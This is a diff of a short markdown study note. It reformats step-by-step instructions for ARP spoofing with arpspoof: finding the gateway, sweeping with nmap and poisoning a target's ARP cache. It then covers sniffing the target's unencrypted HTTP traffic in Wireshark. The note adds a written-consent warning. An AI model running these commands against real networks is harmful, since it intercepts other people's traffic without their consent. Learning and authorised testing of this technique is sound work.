@@ -4,26 +4,54 @@
 
 arpspoof \(kali\) -- works by forging ARP replies to communicating parties
 
-### Sniffing on a private network - Step by Step
-
 **Requirements**
 
-* arpspoof / dsniff
-* wireshark
+arpspoof / dsniff
 
-1. Figure out the Default Gateway first by \`route -n\` command.
+Wireshark
 
-2. Narrow down the target by running \`nmap\` sweep.
+### Sniffing on a private network - Step by Step
 
-3. To start ARP spoofing, run 
+Figure out the Default Gateway first by command:
 
-`sudo arpspoof -i [interfacename] -c host -t [target-ip] [default-gateway-ip]`
+```
+route -n
+```
 
-	1. e.g. `sudo arpspoof -i wlan0 -c host -t 192.168.1.122 192.168.1.1`
+Narrow down the target by running \`nmap\` sweep 
 
-1. arpspoof should now be sending arp replies to the gateway and target with spoofed addresses
+> Be sure to get written consent for any network scanning activities. Criminal penalties can be levied onto you if permission is not granted.
 
-2. Open Wireshark and apply the `tcp port http` to listen to unencrypted traffic between the router and the target.
+```
+nmap [host-network]
+```
 
-3. Once done, stop the `arpspoof` process to depoison ARP tables in gateway and target.
+To start ARP spoofing, run
+
+```
+sudo arpspoof -i [interfacename] -c host -t [target-ip] [default-gateway-ip]
+```
+
+e.g.
+
+```
+sudo arpspoof -i wlan0 -c host -t 192.168.1.122 192.168.1.1
+```
+
+arpspoof should now be sending arp replies to the gateway and target with spoofed addresses
+
+Open Wireshark and apply the `tcp port http` to listen to unencrypted traffic between the router and the target.
+
+```
+tcp port http
+```
+
+Once done, stop the `arpspoof` process to depoison ARP tables in gateway and target.
+
+```
+> arpspoof
+[Ctrl+C] to send SIGINT signal
+```
+
+
 
